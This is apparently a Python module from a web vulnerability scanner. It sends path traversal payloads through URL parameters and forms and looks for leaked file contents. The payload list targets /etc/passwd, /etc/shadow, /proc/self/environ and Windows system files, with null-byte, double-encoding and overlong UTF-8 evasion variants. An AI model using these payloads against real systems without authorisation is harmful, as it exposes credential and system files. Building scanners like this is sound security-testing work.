"""
Path Traversal Scanner — Industrial-Grade Detection v5.0.

Expanded to cover double encoding, null byte, UTF-8 overlong encoding, and form-based testing.
Uses pre-encoded payloads to avoid double-encoding by inject_into_params.
"""

from core.http_client import get, DEFAULT_TIMEOUT
from core.config import ScannerConfig
from core.response_analyzer import (
    get_baseline, diff_responses, detect_waf_block,
    calculate_confidence, make_finding,
)
from core.utils import inject_into_params, get_forms, submit_form

# Payloads are NOT pre-URL-encoded to avoid double-encoding
PATH_PAYLOADS = [
    # Basic
    ("../../../../etc/passwd", ["root:x:0:0", "daemon:x:"]),
    ("....//....//....//....//etc/passwd", ["root:x:0:0"]),
    ("../../../../etc/shadow", ["root:$"]),
    ("/proc/self/environ", ["PATH=", "HOME="]),
    ("..\\..\\..\\..\\windows\\win.ini", ["[extensions]", "[fonts]"]),
    ("..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", ["127.0.0.1"]),
    
    # Null Byte Injection (PHP < 5.3.4)
    ("../../../../etc/passwd%00", ["root:x:0:0"]),
    ("../../../../etc/passwd\x00.html", ["root:x:0:0"]),
    ("../../../../etc/passwd%00.jpg", ["root:x:0:0"]),

    # Double Encoding
    ("..%252f..%252f..%252f..%252fetc%252fpasswd", ["root:x:0:0"]),
    ("%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", ["root:x:0:0"]),
    ("..%c0%af..%c0%af..%c0%afetc/passwd", ["root:x:0:0"]),

    # UTF-8 Overlong Encoding
    ("..%c0%ae/..%c0%ae/..%c0%ae/..%c0%ae/etc/passwd", ["root:x:0:0"]),
    ("%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", ["root:x:0:0"]),
]


def test_path_traversal(url):
    baseline = get_baseline(url, get)
    findings = []

    # 1. Parameter-based testing
    for payload, indicators in PATH_PAYLOADS:
        for param, crafted_url in inject_into_params(url, payload):
            try:
                r = get(crafted_url, timeout=DEFAULT_TIMEOUT)
                waf_blocked, _ = detect_waf_block(r)
                if waf_blocked:
                    continue

                text_lower = r.text.lower()
                signals = {}
                evidence = ""

                for ind in indicators:
                    ind_lower = ind.lower()
                    if ind_lower in text_lower and ind_lower not in baseline["text_lower"]:
                        signals["file_content"] = True
                        evidence = ind
                        break

                signals["response_diff"] = diff_responses(baseline["text"], r.text) < ScannerConfig.DIFF_THRESHOLD
                signals["content_length"] = abs(len(r.text) - baseline["content_length"]) > 100

                confidence = calculate_confidence(signals)
                if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                    f = make_finding(
                        url, "Path Traversal", confidence, signals,
                        details=f"File content '{evidence}' via param '{param}'",
                        severity="Critical" if "passwd" in payload or "shadow" in payload or "win.ini" in payload else "High",
                        payload=payload, evidence=evidence, parameter=param,
                    )
                    if f: findings.append(f)
            except Exception:
                continue

    # 2. Form-based testing
    forms = get_forms(url)
    for payload, indicators in PATH_PAYLOADS[:10]: # Test fewer payloads on forms
        for form in forms:
            try:
                r = submit_form(form, url, payload)
                waf_blocked, _ = detect_waf_block(r)
                if waf_blocked:
                    continue

                text_lower = r.text.lower()
                signals = {}
                evidence = ""

                for ind in indicators:
                    if ind.lower() in text_lower and ind.lower() not in baseline["text_lower"]:
                        signals["file_content"] = True
                        evidence = ind
                        break

                signals["response_diff"] = diff_responses(baseline["text"], r.text) < ScannerConfig.DIFF_THRESHOLD

                confidence = calculate_confidence(signals)
                if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                    f = make_finding(
                        url, "Path Traversal (Form-Based)", confidence, signals,
                        details=f"File content '{evidence}' via form",
                        severity="Critical" if "passwd" in payload or "shadow" in payload or "win.ini" in payload else "High",
                        payload=payload, evidence=evidence,
                    )
                    if f: findings.append(f)
            except Exception:
                continue

    if not findings:
        return None
    if len(findings) == 1:
        return findings[0]
    return findings